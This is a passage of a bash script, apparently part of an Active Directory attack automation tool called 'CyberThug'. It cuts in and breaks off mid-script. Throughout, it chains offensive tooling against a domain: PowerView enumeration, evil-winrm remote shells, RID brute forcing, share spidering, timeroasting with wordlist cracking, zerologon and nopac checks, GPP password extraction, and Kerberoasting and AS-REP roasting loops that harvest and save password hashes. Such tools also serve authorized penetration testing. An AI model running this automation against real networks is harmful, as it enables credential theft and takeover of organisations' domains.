send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e \\\"\\\e[1;32m[+] Getting TGT for $user ...\e[0m\\\"
echo ''
getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
export KRB5CCNAME=$user.ccache
echo ''
echo -e \\\"\\\e[1;32m[+]-- powerview $CLEAN_DOMAIN/$user:$p@$DC -k --[+]\e[0m\\\"
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$user:$p@$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e \\\"\\\e[1;33m[!] powerview failed for $user again with ticket\e[0m\\\"
exec bash\"  
gnome-terminal -- bash -c \"
echo -e \\\"\\\e[1;32m[+] User: $user\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Password: $p\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] DC: $DC\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Domain: $CLEAN_DOMAIN\e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Ip: $Ip\e[0m\\\"

echo -e \\\"\\\e[1;32m[+] Trying Evil-WinRM direct auth for $user ...\e[0m\\\"
echo '' 
echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -p $p --[+]\e[0m\\\"
echo ''
evil-winrm -i $DC -u $user -p $p

if [ \$? -ne 1 ]; then
    echo ''
    echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for $user. Trying getTGT.py and Kerberos auth ..\e[0m\\\"
    echo ''

    getTGT.py $CLEAN_DOMAIN/$user:$p -dc-ip $Ip -k
    echo ''

    if [ -f $user.ccache ]; then
        export KRB5CCNAME=$user.ccache
        echo ''
        echo -e \\\"\\\e[1;34m[+]-- Running evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN --[+]\e[0m\\\"
        echo ''   
        evil-winrm -i $DC -u $user -r $CLEAN_DOMAIN
        if [ \$? -ne 0 ]; then
            echo ''
            echo -e \\\"\\\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\\\"
            echo ''
        fi
    else
        echo -e \\\"\\\e[1;31m[-] getTGT.py failed. No ccache found for $user.\e[0m\\\"
        echo ''
    fi
fi
exec bash\"

exec bash
"
        done
    fi
    sleep 5
done
    echo ""
fi  
exec bash
'
}
            ntlmrelay_mitm6      
 	    echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --continue-on-success $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password --continue-on-success $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --users $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password --users $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --rid-brute $flag --[+]\033[0m"
            echo ""
	    for i in {1..15}; do
  	       dots=$(( (i - 1) % 3 + 1 ))
  	       echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
  	       sleep 0.1
	    done
	    echo ""
            nxc smb $DOMAIN -u $User -p $Password --rid-brute $flag > /tmp/.test_nxc_rid_brute 
            echo "" 
            grep 'SidTypeUser' /tmp/.test_nxc_rid_brute | awk '{ sub(/^.*\\/, "", $6); print $6 }' > /tmp/.test1_nxc_rid_brute 
            cat /tmp/.test_nxc_rid_brute
            cp /tmp/.test1_nxc_rid_brute $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/nxc_rid_brute_$DOMAIN_$DATE 2>/dev/null
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --shares $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password --shares $flag
            echo ""
  	    for i in {1..15}; do
               dots=$(( (i - 1) % 3 + 1 ))
               echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
               sleep 0.1
            done
            echo ""
	    nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk 'NR>6 && $0 ~ /READ/ {for(i=5;i<=NF && $i !~ /READ/; i++) printf "%s%s",$i,(i<NF?" ":"\n"); print ""}' > /tmp/shares.txt
            if [[ -s /tmp/shares.txt ]]; then
                if [[ -f "$User" || -f "$Password" ]]; then
		    :
                else
                    gnome-terminal -- bash -c "
                        echo -e '\033[1;32m[+]-- Running Smbclient for => $User --[+]\033[0m'
                        while read -r share; do
                            echo \"\"
                            echo -e \"\033[1;34m[*] \$share\033[0m\" 
  			    gnome-terminal -- bash -c \"
	                       echo -e '\033[36m[+] Connecting to share: //$DC/\$share\033[0m'
          	               echo -e '\033[36m[+] User: $User\033[0m'
                   	       echo -e '\033[36m[+] Password: $Password\033[0m'
                               echo \"\"
                    	       smbclient //$DC/'\$share' -U $User%$Password
                               echo \"\"
                    	       echo -e '\033[36m[+] Getting TGT for => $User\033[0m'
			       echo \"\"
                    	       getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 
                    	       export KRB5CCNAME=${User}.ccache
                               echo \"\"
                    	       smbclient.py -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
                    	       exec bash
                	    \"
                        done < /tmp/shares.txt
                        exec bash
                    "
                fi
            fi
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag 
            echo "" 
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --loggedon-users $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password --loggedon-users $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M timeroast $flag --[+]\033[0m"
	    echo ""  
            nxc smb $DOMAIN -u $User -p $Password -M timeroast $flag > /tmp/.timeroast
	    cat /tmp/.timeroast
	    cat /tmp/.timeroast | awk "{print $ 5}" | sed 's/\[\*\]//g' | sed 's/\[+]//g'  > /tmp/.timeroast1
	    cp /tmp/.timeroast1 $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/timeroast_$DOMAIN_$DATE 2>/dev/null
	    if grep -iq sntp /tmp/.timeroast1; then 
    		gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Cracking timeroast Hashes --[+]\e[0m'; echo '' ; python3 $HOME/Downloads/tools/Files/Timeroast.py /tmp/.timeroast1 /usr/share/wordlists/rockyou.txt; exec bash"
            fi 
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M enum_av $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M enum_av $flag
	    echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password --pass-pol $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password --pass-pol $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --groups $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password --groups $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --computers $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password --computers $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --get-sid $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password --get-sid $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M enum_trusts $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password -M enum_trusts $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M maq $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password -M maq $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M zerologon $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M zerologon $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M coerce_plus $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M coerce_plus $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M nopac $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M nopac $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M gpp_password $flag --[+]\033[0m"
            echo ""
            nxc smb $DOMAIN -u $User -p $Password -M gpp_password $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc winrm $DOMAIN -u $User -p $Password $flag --[+]\033[0m"
            echo ""
            nxc winrm $DOMAIN -u $User -p $Password $flag
            echo ""
            echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag --[+]\033[0m"
            echo ""
            nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
            echo ""
            if [[ -f "$User" && -f "$Password" ]]; then
                 :
            elif [[ -f "$User" ]]; then
                 :
            elif [[ -f "$Password" ]] ; then
                 :
            else
                 echo -e "\033[36m[+]-- Running findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag --[+]\033[0m"
            	 findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag	
                 echo "----------"
                 echo -e "\033[36m[+]-- Running findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag --[+]\033[0m"
		 findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag
            fi  
            echo ""
            if [[ -f "$User" && -f "$Password" ]]; then
                if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                  echo ""
                  while read -r u; do 
                      while read -r p; do
                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                              echo -e "\033[31m[*] Getting TGT for => $u \033[0m"      
                              getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
                              if [ -f "$u.ccache" ]; then
                              	 export KRB5CCNAME="$u.ccache"
                              fi
                              echo ""  
                          fi     
                          python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u 2>/dev/null
                          grep '^\$krb5tgs\$' /tmp/.tgs.$u > /tmp/.tgs1.txt.$u
                          cat /tmp/.tgs1.txt.$u
                          cp /tmp/.tgs1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null 
                          if [ -s /tmp/.tgs1.txt.$u ]; then 
                              echo "$u" > /tmp/.current_u.txt
                              targeted_kerberoast_check
                              break
                          fi
                      done < $Password
                  done < /tmp/.test1_nxc_rid_brute
                else
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                  echo ""
                  while read -r u; do
                      while read -r p; do
                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                              echo -e "\033[31m[*] Getting TGT for => $u \033[0m"      
                              getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
                              if [ -f "$u.ccache" ]; then
                                 export KRB5CCNAME="$u.ccache"
                              fi
                              echo ""  
                          fi     
                          python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u 2>/dev/null
                          grep '^\$krb5tgs\$' /tmp/.tgs.$u > /tmp/.tgs1.txt.$u 
                          cat /tmp/.tgs1.txt.$u 
                          cp /tmp/.tgs1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                          if [ -s /tmp/.tgs1.txt.$u ]; then 
                              echo "$u" > /tmp/.current_u.txt  
                              targeted_kerberoast_check
                              break
                          fi
                      done < $Password
                  done < $User
                fi
            elif [[ -f "$User" ]]; then
                if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then  
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m" 
                  echo ""
                  for i in $(cat /tmp/.test1_nxc_rid_brute); do
                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                            echo -e "\033[31m[*] Getting TGT for => $i \033[0m"      
                            getTGT.py $CLEAN_DOMAIN/$i:$Password -dc-ip $DC -k 2>/dev/null
                            if [ -f "$i.ccache" ]; then
                                  export KRB5CCNAME="$i.ccache"
                            fi
                            echo ""  
                      fi     
                      python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$i 2>/dev/null
                      grep '^\$krb5tgs\$' /tmp/.tgs.$i > /tmp/.tgs1.txt.$i
                      cat /tmp/.tgs1.txt.$i
                      cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                      if [ -s /tmp/.tgs1.txt.$i ]; then 
                          u="$i"
                          echo "$u" > /tmp/.current_u.txt
                          targeted_kerberoast_check
                          break
                      fi
                  done 
                else
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                  echo ""
                  for i in $(cat $User); do
                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                            echo -e "\033[31m[*] Getting TGT for => $i \033[0m"      
                            getTGT.py $CLEAN_DOMAIN/$i:$Password -dc-ip $DC -k 2>/dev/null
                            if [ -f "$i.ccache" ]; then
                                export KRB5CCNAME="$i.ccache"
                            fi
                            echo ""  
                      fi     
                      python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $i -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$i 2>/dev/null
                      grep '^\$krb5tgs\$' /tmp/.tgs.$i > /tmp/.tgs1.txt.$i
                      cat /tmp/.tgs1.txt.$i
                      cp /tmp/.tgs1.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                      if [ -s /tmp/.tgs1.txt.$i ]; then
                              u="$i"
                              echo "$u" > /tmp/.current_u.txt 
                              targeted_kerberoast_check
                              break
                      fi           
                  done 
                fi 
            elif [[ -f "$Password" ]]; then
                if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then  
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u /tmp/.test1_nxc_rid_brute -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                  echo ""
                  while read -r u; do
                      while read -r p; do
                          if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                                echo -e "\033[31m[*] Getting TGT for => $u \033[0m"      
                                getTGT.py $CLEAN_DOMAIN/$u:$p -dc-ip $DC -k 2>/dev/null
                                if [ -f "$u.ccache" ]; then
                                    export KRB5CCNAME="$u.ccache"
                                fi
                                echo ""  
                          fi     
                          python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $u -p $p -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$u  2>/dev/null
                          grep '^\$krb5tgs\$' /tmp/.tgs.$u  > /tmp/.tgs1.txt.$u 
                          cat /tmp/.tgs1.txt.$u 
                          cp /tmp/.tgs1.txt.$u  $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                          if [ -s /tmp/.tgs1.txt.$u ]; then 
                              echo "$u" > /tmp/.current_u.txt
                              targeted_kerberoast_check
                              break
                          fi          
                      done < $Password
                  done < /tmp/.test1_nxc_rid_brute
                else
                  echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                  echo ""
                  for i in $(cat $Password); do
                      if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                          echo -e "\033[31m[*] Getting TGT for => $User \033[0m"      
                          getTGT.py $CLEAN_DOMAIN/$User:$i -dc-ip $DC -k 2>/dev/null
                          if [ -f "$User.ccache" ]; then
                              export KRB5CCNAME="$User.ccache"
                          fi
                          echo ""  
                      fi     
                      python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $i -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
                      grep '^\$krb5tgs\$' /tmp/.tgs.$User > /tmp/.tgs1.txt.$User
                      cat /tmp/.tgs1.txt.$User
                      cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                      if [ -s /tmp/.tgs1.txt.$User ]; then 
                            u="$User" 
                            echo "$u" > /tmp/.current_u.txt
                            targeted_kerberoast_check
                            break
                      fi 
                  done 
                fi 
            else
                echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag --[+]\033[0m"
                echo ""
                if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                      echo -e "\033[31m[*] Getting TGT for => $User \033[0m"      
                      getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 2>/dev/null
                      if [ -f "$User.ccache" ]; then
                          export KRB5CCNAME="$User.ccache"
                      fi
                      echo ""  
                fi     
                python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
                grep '^\$krb5tgs\$' /tmp/.tgs.$User > /tmp/.tgs1.txt.$User
                cat /tmp/.tgs1.txt.$User
                cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
                echo "" 
                if [ -s /tmp/.tgs1.txt.$User ]; then
                      u="$User" 
                      echo "$u" > /tmp/.current_u.txt
                      targeted_kerberoast_check
                fi            
            fi  
            echo -e "\033[36m[+]-- Running mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip --[+]\033[0m"
            echo ""
            timeout 5 mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip > /tmp/mssql.txt
            if [[ $(wc -l < /tmp/mssql.txt) -gt 5 ]]; then
                gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Running mssqlclient.py on $CLEAN_DOMAIN --[+]\e[0m' ; echo '' ; mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip ; exec bash"
            fi  
            echo ""
            if [[ $(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                if [[ -f "$User" && -f "$Password" ]]; then
                      echo "" 
                      echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                      echo ""
                      for i in {1..15}; do
               		  dots=$(( (i - 1) % 3 + 1 ))
               	          echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
               	          sleep 0.1
                      done
                      echo ""
                      GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                      grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                      cat /tmp/.asrep1.txt
        	      cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                      echo "" 
                      if [[ -s /tmp/.asrep1.txt ]]; then
			  getnpusers_check
                      fi
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN//tmp/.test1_nxc_rid_brute:$Password -request $dc_host $flag --[+]\033[0m"
                      while read -r u; do
                          while read -r p; do
                              echo ""
                    	      echo -e "\033[36m$u\033[0m" 
                              GetUserSPNs.py "$CLEAN_DOMAIN/$u:$p" -request $dc_host $flag 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
                              if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
                                 cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
                                 echo "$u" > /tmp/.current_ii.txt
                                 getuserspns1_check
                                 cat /tmp/.getuserspn-req1.txt.$u
                                 cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                                 rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
                              fi
                          done < $Password
                      done < /tmp/.test1_nxc_rid_brute
                      echo ""
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                      for i in $(cat /tmp/.test1_nxc_rid_brute); do
                          echo ""
                          echo -e "\033[36m$i\033[0m" 
                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                          if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                             cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                             echo "$i" > /tmp/.current_i.txt
			     getuserspns_check
                             cat /tmp/.getuserspn.txt.$i
		             cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                             rm /tmp/.getuserspn.txt.$i 2>/dev/null 
                          fi
                      done
                elif [[ -f "$User" ]]; then
                      echo ""
                      echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                      echo ""
                      for i in {1..15}; do
                          dots=$(( (i - 1) % 3 + 1 ))
                          echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
                          sleep 0.1
                      done
                      echo ""                      
                      GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                      grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                      cat /tmp/.asrep1.txt
        	      cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                      echo "" 
                      if [[ -s /tmp/.asrep1.txt ]]; then
                          getnpusers_check
                      fi
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py $CLEAN_DOMAIN//tmp/.test1_nxc_rid_brute:$Password -request $dc_host $flag --[+]\033[0m"
                      while read -r u; do
                          echo ""
                          echo -e "\033[36m$u\033[0m" 
                          GetUserSPNs.py $CLEAN_DOMAIN/$u:$Password -request $dc_host $flag | grep '^\$krb5tgs\$' >> /tmp/.getuserspn-req.txt.$u
                          if [[ -s /tmp/.getuserspn-req.txt.$u ]]; then
                             cp /tmp/.getuserspn-req.txt.$u /tmp/.getuserspn-req1.txt.$u
                             echo "$u" > /tmp/.current_ii.txt
                             getuserspns1_check
                             cat /tmp/.getuserspn-req1.txt.$u
                             cp /tmp/.getuserspn-req1.txt.$u $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn-req1_tgs_$DOMAIN_$DATE 2>/dev/null
                             rm /tmp/.getuserspn-req1.txt.$u 2>/dev/null 
                          fi
                      done < /tmp/.test1_nxc_rid_brute
                      echo ""
                      echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ --[+]\033[0m"
                      for i in $(cat /tmp/.test1_nxc_rid_brute); do
                          echo ""
                          echo -e "\033[36m$i\033[0m"
                          GetUserSPNs.py -no-preauth "$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\$krb5tgs\$' >> /tmp/.getuserspn.txt.$i
                          if [[ -s /tmp/.getuserspn.txt.$i ]]; then
                              cp /tmp/.getuserspn.txt.$i /tmp/.getuserspn1.txt.$i
                              echo "$i" > /tmp/.current_i.txt
                              getuserspns_check
                              cat /tmp/.getuserspn.txt.$i
                              cp /tmp/.getuserspn.txt.$i $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                              rm /tmp/.getuserspn.txt.$i 2>/dev/null 
                          fi                               
                      done
                elif [[ -f "$Password" ]]; then
                      echo ""
                      echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
                      echo ""
                      for i in {1..15}; do
                          dots=$(( (i - 1) % 3 + 1 ))
                          echo -ne "\r\033[31mProcessing $(printf "%-${dots}s" | tr ' ' '.')\033[0m"
                          sleep 0.1
                      done
                      echo ""                      
                      GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
                      grep '^\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
                      cat /tmp/.asrep1.txt
        	      cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_-t_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
                      echo "" 
                      if [[ -s /tmp/.asrep1.txt ]]; then
                          getnpusers_check
                      fi
